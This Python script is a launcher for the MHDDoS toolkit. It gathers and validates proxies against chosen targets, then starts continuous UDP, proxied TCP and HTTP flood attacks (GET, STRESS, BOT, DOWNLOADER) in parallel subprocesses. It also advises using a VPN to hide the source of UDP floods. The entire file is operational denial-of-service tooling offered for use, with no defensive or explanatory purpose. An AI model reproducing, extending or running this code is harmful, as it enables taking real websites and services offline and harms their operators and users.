import argparse
import json
import multiprocessing
import os
import random
import subprocess
import sys
import time

from MHDDoS.start import ProxyManager
from PyRoxy import ProxyChecker
from PyRoxy import ProxyType


def update_proxies(period, proxy_timeout, threads, targets):
    #  Avoid parsing proxies too often when restart happens
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time.time() - last_update) < period / 2:
            return

    with open('../proxies_config.json') as f:
        config = json.load(f)

    Proxies = list(ProxyManager.DownloadFromConfig(config, 0))
    random.shuffle(Proxies)

    CheckedProxies = []
    size = len(targets)
    print(f'{len(Proxies):,} Proxies are getting checked, this may take awhile:')
    for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
        print(f'{len(chunk):,} Proxies are getting checked for {target}')
        CheckedProxies.extend(
            ProxyChecker.checkAll(chunk, timeout=proxy_timeout, threads=threads, url=target)
        )

    if not CheckedProxies:
        exit("Proxy Check failed, Your network may be the problem | The target may not be available.")

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', "w") as all_wr, \
         open('files/proxies/socks4.txt', "w") as socks4_wr, \
         open('files/proxies/socks5.txt', "w") as socks5_wr:
        for proxy in CheckedProxies:
            proxy_string = str(proxy) + "\n"
            all_wr.write(proxy_string)
            if proxy.type == ProxyType.SOCKS4:
                socks4_wr.write(proxy_string)
            if proxy.type == ProxyType.SOCKS5:
                socks5_wr.write(proxy_string)


def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        # UDP
        if target.lower().startswith('udp://'):
            print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
            params_list.append([
                'UDP', target[6:], str(udp_threads), str(period)
            ])

        # TCP
        elif target.lower().startswith('tcp://'):
            for socks_type, socks_file, threads in (
                ('4', 'socks4.txt', threads_per_target // 2),
                ('5', 'socks5.txt', threads_per_target // 2),
            ):
                params_list.append([
                    'TCP', target[6:], str(threads), str(period), socks_type, socks_file
                ])

        # HTTP(S)
        else:
            method = random.choice(http_methods)
            params_list.append([
                method, target, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)
            ])

    processes = []
    for params in params_list:
        if debug:
            params.append('true')
        processes.append(
            subprocess.Popen([sys.executable, './start.py', *params])
        )

    for p in processes:
        p.wait()


def start(total_threads, period, targets, rpc, udp_threads, http_methods, proxy_timeout, debug):
    os.chdir('MHDDoS')
    no_proxies = all(target.lower().startswith('udp://') for target in targets)
    while True:
        if not no_proxies:
            update_proxies(period, proxy_timeout, total_threads, targets)
        run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='+',
        help='List of targets, separated by spaces',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=100 * multiprocessing.cpu_count(),
        help='Total number of threads (default is 100 * CPU Cores)',
    )
    parser.add_argument(
        '-p',
        '--period',
        type=int,
        default=300,
        help='How often to update the proxies (in seconds) (default is 300)',
    )
    parser.add_argument(
        '--proxy-timeout',
        metavar='TIMEOUT',
        type=float,
        default=2,
        help='How many seconds to wait for the proxy to make a connection. '
             'Higher values give more proxies, but with lower speed/quality. It also takes more time (default is 2)',
    )
    parser.add_argument(
        '--rpc',
        type=int,
        default=50,
        help='How many requests to send on a single proxy connection (default is 50)',
    )
    parser.add_argument(
        '--udp-threads',
        type=int,
        default=1,
        help='Threads to run per UDP target',
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        default=False,
        help='Enable debug output from MHDDoS',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        default=['GET', 'STRESS', 'BOT', 'DOWNLOADER'],
        help='List of HTTP(s) attack methods to use. Default is GET, STRESS, BOT, DOWNLOADER',
    )
    return parser


if __name__ == '__main__':
    args = init_argparse().parse_args()
    start(
        args.threads,
        args.period,
        args.targets,
        args.rpc,
        args.udp_threads,
        args.http_methods,
        args.proxy_timeout,
        args.debug,
    )
